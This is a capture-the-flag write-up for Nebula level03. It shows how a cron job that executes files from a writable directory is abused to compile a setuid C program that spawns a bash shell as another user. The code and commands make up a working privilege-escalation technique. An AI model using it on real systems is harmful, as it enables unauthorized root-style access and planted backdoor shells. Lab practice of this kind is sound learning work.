# Level03

## Task

>Check the home directory of flag03 and take note of the files there.

>There is a crontab that is called every couple of minutes.

>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.

## Solution

The files in `/home/flag03/` show a directory and a shell script

```bash
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

To manipulate this i put the following as /tmp/shell.c

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/bin/bash");
}
```

Then put the following in `/home/flag03/writable.d/` and wait for it to run

```bash
#!/bin/bash

gcc /tmp/shell.c -o /home/flag03/shell
chmod +s /home/flag03/shell
```

After it has ran, i can run the shell file and get the flag

```
level03@nebula:/home/flag03$ ls writable.d/
run.sh
level03@nebula:/home/flag03$ ls writable.d/
```

```
level03@nebula:/home/flag03$ ./shell
flag03@nebula:/home/flag03$ getflag
You have successfully executed getflag on a target account
```
